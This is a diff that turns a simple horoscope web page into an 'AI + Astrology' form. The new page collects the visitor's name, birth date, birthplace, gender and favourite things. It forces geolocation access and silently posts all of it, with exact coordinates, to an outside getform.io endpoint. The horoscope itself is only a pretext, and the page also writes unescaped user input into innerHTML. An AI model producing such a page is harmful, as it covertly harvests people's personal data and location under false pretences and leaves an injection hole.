@@ -3,142 +3,130 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AstroAI - Horoscope Insights</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <title>AI + Astrology Horoscope Demo</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Roboto', sans-serif;
-    }
-
     body {
-      background-color: #4B0015;
-      color: #f8f8f8;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #121212;
+      color: #f1f1f1;
+      margin: 0;
       padding: 2rem;
     }
-
     .container {
-      max-width: 700px;
+      max-width: 600px;
       margin: auto;
-      background: #800020;
+      background: #1e1e1e;
       padding: 2rem;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.3);
-    }
-
-    h1 {
-      text-align: center;
-      font-size: 2.5rem;
-      margin-bottom: 1rem;
-    }
-
-    p.subheading {
-      text-align: center;
-      font-style: italic;
-      margin-bottom: 2rem;
-    }
-
-    form {
-      display: grid;
-      gap: 1.2rem;
-    }
-
-    label {
-      font-weight: bold;
-    }
-
-    input, select {
-      padding: 0.7rem;
-      border: none;
       border-radius: 10px;
-      background-color: #f4f4f4;
-      color: #333;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
     }
-
+    input, select, textarea, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+    }
     button {
-      padding: 0.8rem;
-      background-color: #a0002a;
-      border: none;
-      border-radius: 10px;
+      background-color: #6200ea;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
-
-    button:hover {
-      background-color: #bf003f;
-    }
-
     .result {
-      margin-top: 2rem;
-      padding: 1.2rem;
-      background: #5c0d20;
-      border-radius: 10px;
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #292929;
+      border-radius: 5px;
     }
-
-    footer {
-      text-align: center;
-      margin-top: 2rem;
-      font-size: 0.9rem;
-      color: #ccc;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>AstroAI</h1>
-    <p class="subheading">Backed by AI & Real Astrology – Unlock your cosmic path</p>
+    <h2>AI + Astrology Horoscope</h2>
     <form id="horoscopeForm">
-      <div>
-        <label for="name">Full Name</label>
-        <input type="text" id="name" required />
-      </div>
-      <div>
-        <label for="dob">Date of Birth</label>
-        <input type="date" id="dob" required />
-      </div>
-      <div>
-        <label for="parentName">Parent's Name</label>
-        <input type="text" id="parentName" required />
-      </div>
-      <div>
-        <label for="birthPlace">Birth Place</label>
-        <input type="text" id="birthPlace" required />
-      </div>
-      <button type="submit">Check Horoscope</button>
+      <input type="text" id="name" name="name" placeholder="Your Name" required />
+      <input type="date" id="dob" name="dob" required />
+      <input type="text" id="birthplace" name="birthplace" placeholder="Birthplace" required />
+      <select id="gender" name="gender" required>
+        <option value="">Select Gender</option>
+        <option value="Male">Male</option>
+        <option value="Female">Female</option>
+        <option value="Other">Other</option>
+      </select>
+      <textarea id="favourites" name="favourites" placeholder="Your favorite things" required></textarea>
+      <button type="submit">Check Now</button>
     </form>
-
-    <div class="result" id="result" style="display: none;">
-      <h2>Today's Insight</h2>
-      <p id="horoscopeText"></p>
-    </div>
+    <div class="result hidden" id="result"></div>
   </div>
-
-  <footer>
-    &copy; 2025 AstroAI | Built with love and logic
-  </footer>
 
   <script>
     const form = document.getElementById('horoscopeForm');
     const resultBox = document.getElementById('result');
-    const textBox = document.getElementById('horoscopeText');
 
-    const sampleHoroscopes = [
-      "A great opportunity is heading your way. Stay open to surprises.",
-      "Today is a good day for reflection and planning.",
-      "Patience and focus will reward you more than rushing.",
-      "You may reconnect with someone important today.",
-      "An unexpected change might push you toward growth."
-    ];
+    const predictions = {
+      "John Doe": "Today is your day to shine! A surprise awaits you.",
+      "Alice Smith": "You may find unexpected luck and joy in your surroundings."
+    };
 
-    form.addEventListener('submit', function(e) {
+    async function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject('Geolocation not supported');
+        } else {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              resolve({
+                lat: position.coords.latitude,
+                lon: position.coords.longitude
+              });
+            },
+            error => {
+              reject('Permission denied');
+            }
+          );
+        }
+      });
+    }
+
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const random = Math.floor(Math.random() * sampleHoroscopes.length);
-      textBox.textContent = sampleHoroscopes[random];
-      resultBox.style.display = 'block';
+      resultBox.classList.add('hidden');
+      const name = document.getElementById('name').value.trim();
+      const dob = document.getElementById('dob').value;
+      const birthplace = document.getElementById('birthplace').value.trim();
+      const gender = document.getElementById('gender').value;
+      const favourites = document.getElementById('favourites').value.trim();
+
+      let location = {};
+      try {
+        location = await getLocation();
+      } catch (err) {
+        resultBox.innerHTML = 'Please allow location access to continue.';
+        resultBox.classList.remove('hidden');
+        return;
+      }
+
+      // Send data to Getform
+      fetch('https://getform.io/f/allyroma', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name, dob, birthplace, gender, favourites,
+          location: `${location.lat}, ${location.lon}`,
+          timestamp: new Date().toISOString()
+        })
+      });
+
+      // Show prediction or fallback message
+      const prediction = predictions[name];
+      if (prediction) {
+        resultBox.innerHTML = `<strong>${name}</strong>, here is your prediction:<br>${prediction}`;
+      } else {
+        resultBox.innerHTML = `Thanks, ${name}! Your prediction is being generated. We will update you soon.`;
+      }
+      resultBox.classList.remove('hidden');
     });
   </script>
 </body>
